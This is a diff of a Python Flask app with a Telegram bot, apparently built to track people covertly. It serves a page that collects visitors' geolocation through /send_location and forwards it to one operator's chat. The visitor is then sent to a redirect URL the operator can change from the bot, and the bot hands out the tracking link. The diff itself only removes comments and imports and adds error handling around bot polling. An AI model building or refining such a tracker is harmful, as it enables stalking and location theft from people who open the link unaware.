@@ -4,8 +4,6 @@ from telebot import types
 import threading
 from flask_cors import CORS
 import os
-import requests
-from io import BytesIO
 
 # === Flask app ===
 app = Flask(__name__, static_folder='static')
@@ -16,15 +14,12 @@ CHAT_ID = 651911888  # Только ты
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# URL редиректа, который можно менять через бота
 redirect_url = "https://yandex.ru"
 
-# 🔁 Роут: отдать HTML
 @app.route('/')
 def index():
     return send_from_directory(app.static_folder, 'index.html')
 
-# 📡 Получение геолокации от клиента
 @app.route('/send_location', methods=['POST'])
 def receive_location():
     data = request.get_json()
@@ -35,12 +30,10 @@ def receive_location():
         return jsonify({"status": "ok"})
     return jsonify({"status": "error"}), 400
 
-# 🔁 Вернуть текущий redirect_url
 @app.route('/get_redirect')
 def get_redirect():
     return jsonify({"redirect_url": redirect_url})
 
-# === Telegram bot ===
 RENDER_URL = 'https://geo-tracker-l5ui.onrender.com'
 user_waiting_for_url = set()
 
@@ -77,10 +70,12 @@ def send_render_link(message):
         return
     bot.send_message(message.chat.id, f"Вот твоя ссылка:\n{RENDER_URL}")
 
-# === Запуск ===
 def run_bot():
-    bot.remove_webhook()
-    bot.infinity_polling()
+    try:
+        bot.remove_webhook()  # Чистим возможный вебхук
+        bot.infinity_polling()
+    except Exception as e:
+        print(f"Ошибка polling бота: {e}")
 
 if __name__ == "__main__":
     threading.Thread(target=run_bot, daemon=True).start()
